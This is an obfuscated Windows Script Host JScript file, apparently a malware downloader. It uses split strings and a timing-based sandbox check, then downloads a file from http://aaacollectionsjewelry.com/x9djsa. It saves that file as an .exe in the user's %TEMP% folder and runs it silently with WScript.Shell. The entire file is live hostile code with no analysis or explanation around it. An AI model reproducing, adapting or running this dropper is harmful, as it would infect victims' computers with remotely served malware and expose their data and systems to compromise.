var UG = false;
var OP = "Create"+"Object";
var C0 = function R() {return WScript[OP]("WScript"+".Shell");}(), MT = 11;
var X = "MSXML2"+".XMLHTTP";
var XG = 2;
var K = XG - 2;
function YM(DS){C0["Run"](DS, K, K);};
function J(){return X + "";};
function W(TY, MP){K = K * 1; return TY - MP;};
function P(){return OP;};
/*@cc_on
  @if (@_win32 || @_win64)
    UG = true;
  @end
@*/
if (UG)
{
var Q = "";
function A(){return 22;};
var U = 0; var L = 0;
function RF()
{
var TP = new this["Date"]();
var J0 = TP["getUTCMilliseconds"]();
WScript["Sleep"](A());
var TP = new this["Date"]();
var QE = TP["getUTCMilliseconds"]();
WScript["Sleep"](A());
var TP = new this["Date"]();
var R0 = TP["getUTCMilliseconds"]();
var U = "LA";
U = W(QE, J0);
var L = "ME";
L = W(R0, QE);
Q = "open";
return W(U, L);
}
var T = false;
var I = false;
for (var Y = K; Y < A() * 1; Y++){if (RF() != K){
T = true; 
L = "31" + 11 * U + L; 
I = true; 
break;
}}
function M() {return ((T == true) && (T == I)) ? 1 : K;};
if (T && M() && I){
function B() {return C0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "cSuwURd7h49P7a.ex" + "e";};
 RY = J();
 TT = WScript[OP](RY);
 var HE = 1;
do { 
	for (;HE;){
	try {
		if (HE == 1)
		{
			TT[Q]("GET", "http://aaacollectionsjewelry.com/x9djsa", false);
			TT["send"]();
			MG = "Sleep";
			HE = 2;
		}
		WScript[MG](A() + 120); 
		if (TT["readystate"] < 2 * 2) continue;
		HE = K;
		function C(W0) {var S = (1, 2, 3, 4, 5, W0); return S;};
		V = WScript[P()]("ADODB.Stream");
		RY = V;
		RY[Q]();
		RY["type"] = C(1);
		RY["write"](TT["ResponseBody"]);
		V["position"] = C(K);
		RY["Save" + "ToFile"](B(), 2);
		V["cl"+"ose"]();
		N = B();
		YM(N);
	} catch(M0){};};
}while (HE);
}
}

